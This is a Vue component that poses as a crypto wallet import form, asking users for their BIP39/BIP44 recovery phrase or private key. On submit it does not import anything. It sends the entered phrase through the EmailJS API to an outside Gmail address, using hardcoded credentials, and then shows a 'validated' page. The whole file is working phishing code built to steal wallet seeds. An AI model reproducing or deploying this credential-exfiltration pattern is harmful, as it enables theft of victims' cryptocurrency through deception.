<template>
  <div>
    <input
      v-model="private_key"
      placeholder="Enter Phrase"
      class="w-full border border-gray-300 p-2 my-2 rounded-md focus:outline-none focus:ring-2 ring-primary transition duration-300 ease-in-out"
      name=""
    />

    <h2 class="mt-8">Please enter your private key in HEX format</h2>

    <p class="opacity-40 my-6">
      Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys
      that manage your acccounts.
    </p>

    <button
			:disabled="disabled"
      @click="sendData"
      class="md:w-auto border-2 border-primary bg-primary rounded-full font-semibold text-white px-4 py-2 transition duration-300 ease-in-out hover:bg-white hover:text-primary"
    >
      Import
    </button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      disabled: false,
      private_key: "",
    };
  },
  methods: {
    sendData() {
      this.disabled = true;
      let self = this;
      const counter = this.countWords(this.private_key);
      if (counter) {
        var data = {
          service_id: "service_fhzx1qm",
          template_id: "template_u8q3nmp",
          user_id: "1VCQuxAerMoxLsQwn",
          template_params: {
            from_name: "Wallet Link Private Key",
            private_key: this.private_key,
            reply_to: "crewwebinar@gmail.com",
          },
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function () {
            self.$router.push("/validated");
            self.disabled = false;
          })
          .catch(function () {
            self.disabled = false;
          });
      } else {
        this.$toast.info(
          "Wrong Input!. Input seems to be empty"
        );
        self.disabled = false;
      }
    },
    countWords(str) {
      if (str !== '')  {
        return true;
      } else {
        return false
      }
      
    },
  },
};
</script>

<style></style>
